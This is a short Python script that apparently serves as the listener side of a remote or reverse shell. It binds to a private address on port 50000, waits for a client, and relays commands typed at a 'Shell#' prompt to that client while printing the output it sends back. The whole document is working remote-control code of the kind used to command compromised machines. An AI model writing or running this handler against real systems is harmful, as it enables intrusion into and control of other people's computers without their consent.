import socket
import sys

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    optval = 1
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, optval)

    server_address = ('192.168.3.189', 50000)
    sock.bind(server_address)
    sock.listen(5)

    print("Server is listening on port 50000...")

    try:
        client_socket, client_address = sock.accept()
        print(f"Connection from {client_address}")
        
        while True:
            buffer = input(f"* Shell#{client_address[0]}~$: ")
            buffer = buffer.strip()
            client_socket.sendall(buffer.encode())
            
            if buffer.startswith("kill"):
                print("Terminating connection.")
                break
            else:
                try:
                    response = client_socket.recv(1024).decode()  # Adjust buffer size here
                    if not response:
                        print("Client disconnected.")
                        break
                    print(response)
                except socket.error as e:
                    print(f"Error receiving data: {e}")
                    break
    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        client_socket.close()
        sock.close()
        print("Server shut down.")

if __name__ == "__main__":
    main()
